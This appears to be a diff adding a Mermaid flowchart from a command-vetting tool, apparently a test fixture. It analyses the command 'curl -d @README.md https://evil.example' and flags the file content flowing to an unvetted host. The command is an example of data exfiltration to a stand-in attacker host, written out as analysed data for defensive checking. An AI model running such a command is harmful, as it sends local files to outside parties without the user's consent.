@@ -1,0 +1,4 @@
+flowchart LR
+    n0["command: curl -d @README.md https://evil.example<br/>- path:read README.md [arg 1]<br/>- stdio:stdout content<br/>- net:outbound evil.example POST [arg 2]<br/>mark=insufficient: net:outbound evil.example POST [arg 2]: network-access (host is not vetted)<br/>graph: no-content-flow-to-unvetted-network: unknown (content flows to unvetted host evil.example)"]
+    n1[/"file: README.md"/]
+    n0 -->|"reads: read"| n1
